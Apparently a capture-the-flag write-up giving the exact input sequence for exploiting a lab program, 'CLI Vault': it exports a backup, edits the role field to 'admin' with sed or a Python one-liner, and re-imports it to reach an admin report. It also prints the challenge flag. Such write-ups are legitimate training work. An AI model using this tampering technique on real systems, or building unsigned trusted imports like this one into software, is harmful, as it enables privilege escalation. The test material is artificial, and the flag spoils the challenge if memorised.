# Phase 4 -- Exploit Construction

**Challenge:** CLI Vault (l1-cli-vault-001)
**Source file:** `SOURCE.py`
**Prior artifacts:** `STEP_01.md`, `STEP_02.md`, `STEP_03.md`
**Target chain:** Chain 1 (PRIMARY) -- register -> login -> export -> tamper -> import -> admin-report

---

## Prerequisites

- Python 3 installed (invoked as `python`)
- `SOURCE.py` is in the current working directory
- No prior `vault.db.json` exists (clean run), or if one does exist the chosen username must not already be taken
- Filesystem write access in the working directory (for export file)

---

## Exploit Steps -- Exact Inputs

The program is a REPL. Each "vault>" prompt expects a command, and each command then issues its own `input()` prompts. Below, every line the attacker types is listed in order, with the prompt it answers.

### Step 1: Register a new user account

```
vault> register
  Username: attacker
  Master password: pass1234
  Confirm password: pass1234
```

**Inputs typed (3 lines after the command):**
1. `attacker`
2. `pass1234`
3. `pass1234`

**Expected output:**
```
[+] Account 'attacker' created successfully.
```

**State after this step:**
- `vault.db.json` created on disk (if first run) containing `_system` with the flag and a new `attacker` record
- `db["attacker"]` = `{ "password_hash": "<sha256 of pass1234>", "secrets": {}, "_meta": { "role": "user", "created_by": "self-register", "created_at": "<timestamp>" } }`
- `session` remains unauthenticated (`session.authenticated = False`)

---

### Step 2: Login as the new user

```
vault> login
  Username: attacker
  Password: pass1234
```

**Inputs typed (2 lines):**
1. `attacker`
2. `pass1234`

**Expected output:**
```
[+] Welcome back, attacker! (role: user)
```

**State after this step:**
- `session.username = "attacker"`
- `session.role = "user"`
- `session.authenticated = True`
- `db` unchanged

---

### Step 3: Export vault to a backup file

```
vault> export
  Export filename [vault_backup.json]: vault_backup.json
```

**Inputs typed (1 line):**
1. `vault_backup.json` (or just press Enter for the default)

**Expected output:**
```
[+] Vault exported to 'vault_backup.json'.
```

**State after this step:**
- `session` unchanged
- `db` unchanged
- New file `vault_backup.json` created on disk with contents:

```json
{
  "format_version": 1,
  "exported_at": "<timestamp>",
  "username": "attacker",
  "user_data": {
    "password_hash": "<sha256 of pass1234>",
    "secrets": {},
    "_meta": {
      "role": "user",
      "created_by": "self-register",
      "created_at": "<timestamp>"
    }
  }
}
```

**Critical observation:** The `_meta.role` field is `"user"` and is stored in plaintext in an unprotected file. No MAC, signature, or checksum protects this file.

---

### Step 4: Tamper with the exported backup file (FILESYSTEM OPERATION)

This step happens **outside** the running program. The attacker edits `vault_backup.json` and changes exactly one value:

**Field to change:** `user_data._meta.role`
**Original value:** `"user"`
**New value:** `"admin"`

The tampered file should look like:

```json
{
  "format_version": 1,
  "exported_at": "<timestamp>",
  "username": "attacker",
  "user_data": {
    "password_hash": "<sha256 of pass1234>",
    "secrets": {},
    "_meta": {
      "role": "admin",
      "created_by": "self-register",
      "created_at": "<timestamp>"
    }
  }
}
```

**How to do this in practice:** Use any text editor, `sed`, or a Python one-liner:

```bash
python -c "
import json
with open('vault_backup.json', 'r') as f:
    data = json.load(f)
data['user_data']['_meta']['role'] = 'admin'
with open('vault_backup.json', 'w') as f:
    json.dump(data, f, indent=2)
print('Tampered successfully.')
"
```

Or with `sed`:

```bash
sed -i 's/"role": "user"/"role": "admin"/' vault_backup.json
```

**State after this step:**
- `vault_backup.json` on disk now contains `"role": "admin"` instead of `"role": "user"`
- The running program's `db` and `session` are unchanged (still role = "user")

---

### Step 5: Import the tampered backup

```
vault> import
  Import filename [vault_backup.json]: vault_backup.json
```

**Inputs typed (1 line):**
1. `vault_backup.json` (or just press Enter for the default)

**Expected output:**
```
[+] Vault imported from 'vault_backup.json'. Session refreshed (role: admin).
```

**State after this step:**
- `db["attacker"]["_meta"]["role"]` is now `"admin"` (line 230: `db[session.username] = backup["user_data"]`)
- `vault.db.json` persisted with the admin role (line 231: `save_db(db)`)
- `session.role` is now `"admin"` (line 234-235: role refreshed from imported data)
- `session.authenticated` remains `True`
- `session.username` remains `"attacker"`

**This is the privilege escalation moment.** The import command:
1. Overwrites the user record with tampered data (line 230)
2. Persists the tampered data to disk (line 231)
3. Refreshes the session role from the tampered data (lines 234-235)

No re-authentication is required. No integrity check is performed on the imported file.

---

### Step 6: Access the admin report to reveal the flag

```
vault> admin-report
```

**Inputs typed:** None (no sub-prompts for this command)

**Expected output:**
```
==================================================
          ADMIN -- System Health Report
==================================================
  Vault version  : 1.0.0
  Created        : <timestamp>
  Total users    : 1
  Total secrets  : 0
  System flag    : FLAG{export_import_role_escalation_ftw}
==================================================
```

**State after this step:**
- No state changes (read-only command)
- The flag `FLAG{export_import_role_escalation_ftw}` is printed to stdout

---

## Complete Input Sequence Summary

The following is the exact sequence of lines typed into the program's stdin, in order:

```
register
attacker
pass1234
pass1234
login
attacker
pass1234
export
vault_backup.json
```

*-- pause program, tamper with vault_backup.json (change "role": "user" to "role": "admin"), resume --*

```
import
vault_backup.json
admin-report
```

---

## Why Each Validation Is Bypassed

| Validation Check | Location | How It Is Satisfied |
|---|---|---|
| Username non-empty, not `_`-prefixed, not duplicate | `cmd_register` lines 92-100 | `"attacker"` is a valid new username |
| Password >= 4 chars, matches confirmation | `cmd_register` lines 103-110 | `"pass1234"` is 8 chars, typed twice identically |
| Username exists and password hash matches | `cmd_login` lines 128-135 | We registered with these exact credentials |
| `session.authenticated == True` (export) | `cmd_export` line 179 | We logged in at step 2 |
| `format_version == 1` (import) | `cmd_import` line 221 | Export produces `format_version: 1`; we did not change it |
| `backup["username"] == session.username` (import) | `cmd_import` line 225 | Export produces `username: "attacker"`; we did not change it; session is `"attacker"` |
| `session.authenticated == True` (import) | `cmd_import` line 206 | Still logged in from step 2 |
| `session.role == "admin"` (admin-report) | `cmd_admin_report` line 244 | Import refreshed `session.role` to `"admin"` from the tampered file |

---

## Exploit Flow Diagram

```
                  TRUSTED DOMAIN                    UNTRUSTED DOMAIN
                  (in-process)                       (filesystem)

  register -----> db["attacker"].role = "user"
  login --------> session.role = "user"
  export -------> --------------------------------> vault_backup.json
                                                    { role: "user" }
                                                          |
                                              [TAMPER: role -> "admin"]
                                                          |
  import <------- <-------------------------------- vault_backup.json
       |                                            { role: "admin" }
       |-------> db["attacker"].role = "admin"
       |-------> session.role = "admin"

  admin-report -> session.role == "admin" ? YES
              --> prints FLAG{export_import_role_escalation_ftw}
```

---

## Flag

```
FLAG{export_import_role_escalation_ftw}
```
